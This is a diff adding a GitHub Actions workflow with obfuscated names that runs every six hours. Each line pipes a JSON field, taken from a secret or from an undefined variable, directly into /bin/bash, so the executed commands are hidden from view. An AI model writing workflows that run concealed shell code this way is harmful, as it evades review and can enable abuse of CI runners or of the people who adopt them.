@@ -1,0 +1,23 @@
+name: renshabi6745
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: renshabi6745
+        env:
+          c306: ${{ secrets.c306 }}
+        run: |
+          echo $c306 | jq -r .k739 | /bin/bash
+          echo $npit8 | jq -r .zscxu12 | /bin/bash
+          echo $l44351 | jq -r .oppl91001 | /bin/bash
+          echo $k1439 | jq -r .bfsuc8 | /bin/bash
+          echo $id3504 | jq -r .airy37 | /bin/bash
+          echo $owqo35834 | jq -r .cobe6 | /bin/bash
+          echo $org03294 | jq -r .uqr4853 | /bin/bash
+
